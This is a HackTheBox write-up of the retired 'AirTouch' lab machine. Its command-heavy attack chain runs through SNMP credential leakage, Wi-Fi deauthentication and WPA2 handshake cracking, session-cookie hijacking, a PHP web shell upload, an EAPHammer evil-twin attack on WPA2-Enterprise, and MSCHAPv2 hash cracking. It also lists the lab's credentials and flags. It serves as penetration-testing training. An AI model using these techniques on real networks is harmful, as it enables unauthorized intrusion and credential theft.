# AirTouch — HackTheBox Writeup

**Difficulty:** Medium  
**OS:** Linux  
**Points:** 30  
**Author:** thrandomv

---

## Attack Chain Summary

```
SNMP Enumeration → SSH (consultant) → WPA2-PSK Handshake Capture/Crack
→ Tablet VLAN (192.168.3.0/24) → Cookie Hijack via Wireshark Decrypt
→ File Upload (phtml) → RCE → Creds in login.php → SSH Gateway (user)
→ send_certs.sh (remote creds) → EAPHammer Evil Twin (WPA2-Enterprise)
→ MSCHAPv2 Hash Crack → Corporate VLAN (10.10.10.0/24)
→ hostapd_wpe.eap_user (admin creds) → Root
```

---

## 1. Reconnaissance

### TCP Scan

```bash
nmap -sC -sV -p- --min-rate 5000 -oA airtouche 10.129.244.98
```

**Result:** Only port 22 (SSH) open — classic UDP misdirection.

### UDP Scan — SNMP Discovery

```bash
sudo nmap -sU -p 161 10.129.244.98 -sV
```

Port 161/UDP open — SNMPv1/v3 (net-snmp).

### SNMP Enumeration

```bash
snmp-check 10.129.244.98 -c public -v 2c
```

**Key finding in sysDescr:**
```
"The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
```

Credentials leaked in plaintext via SNMP community string `public`.

---

## 2. Initial Access

```bash
ssh consultant@10.129.244.98
# Password: RxBlZhLmOkacNWScmZ6D
```

```bash
sudo -l
# Result: (ALL) NOPASSWD: ALL
sudo -i
```

```bash
ip a
# Multiple wireless interfaces: wlan0–wlan6
# eth0: 172.20.1.2/24 (Consultant VLAN)

ls ~
# diagram-net.png  photo_2023-03-01_22-04-52.png
```

### Network Topology

```
Consultant VLAN:  172.20.1.0/24    (current)
Tablets VLAN:     192.168.3.0/24   (AirTouch-Internet — WPA2-PSK)
Corporate VLAN:   10.10.10.0/24    (AirTouch-Office   — WPA2-Enterprise)
```

---

## 3. Wireless Recon

```bash
ip link set wlan0 up
iw dev wlan0 scan | grep -E "BSS|SSID|freq"
```

**Targets identified:**

| SSID | BSSID | Channel | Encryption |
|------|-------|---------|------------|
| AirTouch-Internet | f0:9f:c2:a3:f1:a7 | 6 (2437 MHz) | WPA2-PSK |
| AirTouch-Office | ac:8b:a9:aa:3f:d2 | 44 (5220 MHz) | WPA2-Enterprise |

---

## 4. WPA2-PSK Crack — AirTouch-Internet

### Enable Monitor Mode

```bash
iw dev wlan1 set type monitor
ip link set wlan1 up
```

### Capture Handshake (Terminal 1)

```bash
airodump-ng --bssid f0:9f:c2:a3:f1:a7 --channel 6 -w /tmp/hs wlan1
```

### Deauth Client (Terminal 2)

```bash
ip link set wlan2 down
iw dev wlan2 set type monitor
ip link set wlan2 up
iwconfig wlan2 channel 6

aireplay-ng --ignore-negative-one -0 10 \
  -a f0:9f:c2:a3:f1:a7 \
  -c 28:6C:07:FE:A3:22 \
  wlan2
```

Wait for: `WPA handshake: F0:9F:C2:A3:F1:A7`

### Crack

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b f0:9f:c2:a3:f1:a7 /tmp/hs-01.cap
```

**Password: `challenge`**

---

## 5. Pivot to Tablet VLAN (192.168.3.0/24)

```bash
wpa_passphrase "AirTouch-Internet" "challenge" > /tmp/inet.conf
wpa_supplicant -B -i wlan3 -c /tmp/inet.conf
dhclient wlan3
ip addr show wlan3
# inet 192.168.3.46/24
```

### Scan Gateway

```bash
nmap -sV -p- --min-rate 3000 192.168.3.1
# PORT   STATE SERVICE
# 22/tcp open  ssh
# 53/tcp open  domain
# 80/tcp open  http    Apache/2.4.41
```

---

## 6. Cookie Hijack via Wireshark WPA Decryption

### Port Forward (local Kali)

```bash
ssh -f -N -L 4444:192.168.3.1:80 consultant@10.129.244.98
```

### Copy Capture to Kali

```bash
scp consultant@10.129.244.98:/home/consultant/hs-01.cap ./
```

### Wireshark Decrypt

1. Edit → Preferences → Protocols → IEEE 802.11
2. Enable Decryption → Add key:
   - Type: `wpa-pwd`
   - Key: `challenge:AirTouch-Internet`
3. Filter: `http`

**Extracted from HTTP traffic:**
```
PHPSESSID=vskn25v9ebfvfa1cd6ij6smh3s
UserRole=user   →   change to: admin
```

### Alternatively via tshark

```bash
tshark -r hs-01.cap \
  -o "wlan.enable_decryption:TRUE" \
  -o 'uat:80211_keys:"wpa-pwd","challenge:AirTouch-Internet"' \
  -Y "http" \
  -T fields -e http.cookie
```

---

## 7. File Upload → RCE

### Verify Admin Access

```bash
curl -s -b "PHPSESSID=vskn25v9ebfvfa1cd6ij6smh3s;UserRole=admin" \
  http://localhost:4444/index.php | grep -i upload
```

### Create and Upload phtml Shell

The application blocks `.php` but not `.phtml`.

```bash
cat > /tmp/shell.phtml << 'EOF'
<?php system($_GET['c']); ?>
EOF

curl -b "PHPSESSID=vskn25v9ebfvfa1cd6ij6smh3s;UserRole=admin" \
  -F "fileToUpload=@/tmp/shell.phtml" \
  -F "submit=Upload File" \
  http://localhost:4444/index.php
# Response: "The file shell.phtml has been uploaded to folder uploads/"
```

### Confirm RCE

```bash
curl -s -b "PHPSESSID=vskn25v9ebfvfa1cd6ij6smh3s;UserRole=admin" \
  "http://localhost:4444/uploads/shell.phtml?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Read Credentials from login.php

```bash
curl -s -b "PHPSESSID=vskn25v9ebfvfa1cd6ij6smh3s;UserRole=admin" \
  "http://localhost:4444/uploads/shell.phtml?c=cat+/var/www/html/login.php"
```

**Hardcoded credentials found:**
```
user     : JunDRDZKHDnpkpDDvay
manager  : 2wLFYNh4TSTgA5sNgT4
```

---

## 8. User Flag

```bash
# From AirTouch-Consultant:
ssh user@192.168.3.1
# Password: JunDRDZKHDnpkpDDvay

sudo -i
cat /root/user.txt
```

**User Flag:** `**12350ad86298b5b55b9a5d45cc57**`

---

## 9. Pivot Credentials — send_certs.sh

```bash
cat /root/send_certs.sh
```

```bash
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
# SCP target: remote@10.10.10.1
```

Also grab the certificates for the Evil Twin:

```bash
ls /root/certs-backup/
# ca.crt  ca.conf  server.crt  server.csr  server.conf  server.ext  server.key
```

---

## 10. Evil Twin Attack — WPA2-Enterprise (AirTouch-Office)

### Transfer Certs to Consultant Machine

```bash
# On AirTouch-AP-PSK:
ssh user@192.168.3.1 "sudo tar czf - /root/certs-backup/" > /tmp/certs.tar.gz
tar xzf /tmp/certs.tar.gz -C /tmp/
```

### Import Certs into EAPHammer

```bash
cd ~/eaphammer
./eaphammer --cert-wizard import \
  --server-cert /tmp/root/certs-backup/server.crt \
  --ca-cert /tmp/root/certs-backup/ca.crt \
  --private-key /tmp/root/certs-backup/server.key
```

### Launch Rogue AP (Terminal 1)

```bash
./eaphammer --creds \
  -i wlan1 \
  -e "AirTouch-Office" \
  -b ac:8b:a9:aa:3f:d2 \
  -c 44 \
  --auth wpa-eap
```

### Deauth Clients (Terminal 2)

```bash
ip link set wlan2 down
iw dev wlan2 set type monitor
ip link set wlan2 up
iw dev wlan2 set freq 5220

aireplay-ng --ignore-negative-one -0 10 \
  -a ac:8b:a9:aa:3f:d2 wlan2
```

### Captured MSCHAPv2 Hash

```
username:    r4ulcl
domain:      AirTouch
hashcat:     r4ulcl::::37054de64b4990bae2886d352976b0f8f1e6f45fc4f49032:00835bd1b31fb2fb
```

### Crack with Hashcat (local Kali)

```bash
hashcat -m 5500 \
  "r4ulcl::::37054de64b4990bae2886d352976b0f8f1e6f45fc4f49032:00835bd1b31fb2fb" \
  /usr/share/wordlists/rockyou.txt
```

**Cracked: `laboratory`**

---

## 11. Connect to Corporate VLAN (10.10.10.0/24)

```bash
cat > /tmp/office.conf << 'EOF'
ctrl_interface=/var/run/wpa_supplicant
ap_scan=1
network={
  ssid="AirTouch-Office"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=PEAP
  identity="AirTouch\r4ulcl"
  password="laboratory"
  phase1="peapver=0"
  phase2="auth=MSCHAPV2"
}
EOF

pkill wpa_supplicant
wpa_supplicant -B -i wlan4 -c /tmp/office.conf -D nl80211
sleep 10
dhclient wlan4
ip addr show wlan4
# inet 10.10.10.62/24
```

> **Key:** Identity must include domain prefix `AirTouch\r4ulcl`, not just `r4ulcl`.

---

## 12. Root Flag

### SSH to Management Host

```bash
ssh remote@10.10.10.1
# Password: xGgWEwqUpfoOVsLeROeG
```

### Extract Admin Credentials

```bash
cat /etc/hostapd/hostapd_wpe.eap_user
# "admin"  MSCHAPV2  "xMJpzXt4D9ouMuL3JJsMriF7KZozm7"  [2]
```

### Escalate to Root

```bash
su admin
# Password: xMJpzXt4D9ouMuL3JJsMriF7KZozm7

sudo -i
cat /root/root.txt
```

**Root Flag:** `**ee5ead50577e3d199020e7ba5fc1**`

---

## Credentials Summary

| Service | Username | Password | Location |
|---------|----------|----------|----------|
| SSH (Consultant) | consultant | RxBlZhLmOkacNWScmZ6D | SNMP sysDescr |
| WPA2-PSK | — | challenge | aircrack-ng |
| Web App | manager | 2wLFYNh4TSTgA5sNgT4 | login.php |
| SSH (Gateway) | user | JunDRDZKHDnpkpDDvay | login.php (commented) |
| SSH (Corp) | remote | xGgWEwqUpfoOVsLeROeG | send_certs.sh |
| WPA2-Enterprise | r4ulcl | laboratory | hashcat MSCHAPv2 |
| Root (Corp) | admin | xMJpzXt4D9ouMuL3JJsMriF7KZozm7 | hostapd_wpe.eap_user |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | TCP/UDP port scanning |
| snmp-check | SNMP enumeration |
| airodump-ng | WPA handshake capture |
| aireplay-ng | Deauth attacks |
| aircrack-ng | WPA2-PSK cracking |
| wpa_supplicant | WiFi client authentication |
| tshark / Wireshark | WPA traffic decryption |
| curl | Web exploitation / cookie hijack |
| EAPHammer | WPA2-Enterprise Evil Twin |
| hashcat | MSCHAPv2 cracking |

---

*Machine retired. Writeup published post-retirement per HTB guidelines.*
